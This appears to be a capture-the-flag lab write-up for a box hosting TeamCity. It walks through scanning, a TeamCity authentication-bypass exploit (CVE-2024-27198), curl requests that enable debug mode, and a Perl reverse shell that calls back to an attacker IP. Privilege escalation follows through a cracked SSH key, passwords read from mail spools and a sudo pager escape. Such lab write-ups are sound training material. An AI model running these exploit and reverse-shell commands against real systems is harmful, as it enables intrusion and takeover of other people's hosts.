	Nmap scan.
```sh
 nmap -p- --min-rate 5000 -T4 -Pn 192.168.108.91
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 19:57 IST
Nmap scan report for 192.168.108.91
Host is up (0.063s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 26.58 seconds
```

```sh
nmap -sC -sV -T4 -Pn -p 22,25,80 192.168.108.91

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 19:59 IST
Nmap scan report for 192.168.108.91
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 second
```

From above scan we got to know that host is `onlyrands.com`
Visiting web server on port 80. Additionally, hostname was also mentioned on web page.
![](Scrutiny1.png)
![](Scrutiny2.png)
We added hostname to /etc/hosts file.

Just in case, I fuzzed for vhosts. This is my go-to vhost fuzzing command:
```sh
ffuf -H "Host: FUZZ.onlyrands.com" -u http://onlyrands.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -c -fc 403,404 -fs 23375
```

![](Scrutiny3.png)
Make sure to add filter otherwise above command will give lot of subdomains which will create confusion.
ffuf shows me a teams vhost. Make sure to add the new vhost to /etc/hosts.
Upon visiting, we have a TeamCity page.
![](Scrutiny5.png)
There are some very popular recent TeamCity authentication bypass exploits.
https://github.com/Stuub/RCity-CVE-2024-27198?source=post_page-----01737dd96583---------------------------------------

```python
python3 RCity.py -t http://teams.onlyrands.com --no-enum -c id
```
I had to tack on a -c argument for the shell not to exit automatically.

Oh no! But when I enter a command, I get something like this:
![](Scrutiny6.png)
At this point I googled the error, and found 0xdf’s writeup:
https://0xdf.gitlab.io/2024/08/24/htb-runner.html?source=post_page-----01737dd96583---------------------------------------
Turns out we need to **enable debug mode.** We will do this using a POST request with curl.

In order to do this, we first need to get an an admin token using our admin creds.

```sh
curl -X POST http://teams.onlyrands.com/app/rest/users/id:22/tokens/RPC2 -u RCity_Rules_615:iRiYgRHk
```

Where, id, username and password  were received when we ran the exploit 1st time. Highlighted in above POC.
![](Scrutiny7.png)
Take that token from the “value” field, then export to the TOKEN environment variable.
```sh
export TOKEN="eyJ0eXAiOiAiVENWMiJ9.cUx0UTAtdGtPMV90TWlMdVpPMk5xR2ZhcE1j.YWJlMjE4NjgtMzMxZS00ZjA5LTg0NTgtZjkxMDcxODgxMDU2"
```

```sh
curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"
```

![](Scrutiny8.png)
Then refresh:
```sh
curl 'http://teams.onlyrands.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN"
```
![](Scrutiny9.png)

Then run **python3 RCity.py -t** [**http://teams.onlyrands.com/**](http://teams.onlyrands.com/) **-c id** again, now that debug mode is enabled.

```sh
python3 RCity.py -t http://teams.onlyrands.com -c id
```
![](Scrutiny10.png)

Here, we are unable to change the working directory. So we decide to take reverse shell. I tried running bash, nc reverse shells but they didn't work.
![](Scrutiny11.png)
So, after referring a writeup we decided to run a perl reverse shell and we got the shell.
```sh
perl -e 'use Socket;$i="192.168.45.238";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![](Scrutiny12.png)
![](Scrutiny13.png)
Captured local flag.
![](Scrutiny14.png)

### Privilege Escalation
When we tried to check sudo permissions we failed.
![](Scrutiny15.png)
When I did this box, I noticed through the TeamCity admin portal that marcot accidentally gave us an id_rsa.
![](Scrutiny16.png)
You can also find it through running **git log** on /srv/git/freelancers/marcot.git. But it’s obviously easier to download through the site, so just use creds you made through the exploit and do that.
Copy the key and make a file named id_rsa.
![](Scrutiny17.png)
![](Scrutiny18.png)
When trying to run it locally, you see that you need a password for the id_rsa key.
You can find this by using ssh2john to generate a hash, then cracking said hash.
![](Scrutiny19.png)
You’ll very quickly find out that the password is “**cheer**”.

And it took me way too long to find out that the password for marcot is “cheer” as well.

![](Scrutiny20.png)
We checked for sudo permissions.
![](Scrutiny21.png)
Now we can read some of these files in /var/www/mail.

**Just a tip: If you see port 25 or SMTP on the target, always look through /var/mail/ and /var/spool/mail.**

“cat /var/mail/” will do the trick. Can grep for password.
![](Scrutiny22.png)
It’s important to read the email. **Matthew’s not just giving away his password, he’s saying that he left Marco something on his (Matthew’s) account. Also, who’s Dach? With some basic enumeration (/etc/passwd, namely), you can see that Dach corresponds to briand’s account.**

So we can use that password to log in as Matthew.
![](Scrutiny23.png)

![](Scrutiny24.png)

We logged in with matthew credentials
`matthewa : IdealismEngineAshen476`
Once again we checked for sudo permissions but no luck.
![](Scrutiny25.png)
After enumerating for a bit, then taking a step back, I realized that matthew probably hid the secret for marco in his home directory.
![](Scrutiny26.png)
This guy’s easily missable. Never forget dir -a. Even then, I almost missed it.
![](Scrutiny27.png)
`briand : `
There you go, we now have briand’s (Dach’s) password.

Another “su” command, and we’re in.
![](Scrutiny28.png)
Again we checked for sudo permissions.
![](Scrutiny29.png)
![](Scrutiny31.png)
Just use “sudo” to run what “sudo -l” gives us, then once in the pager, run “!sh”.
![](Scrutiny30.png)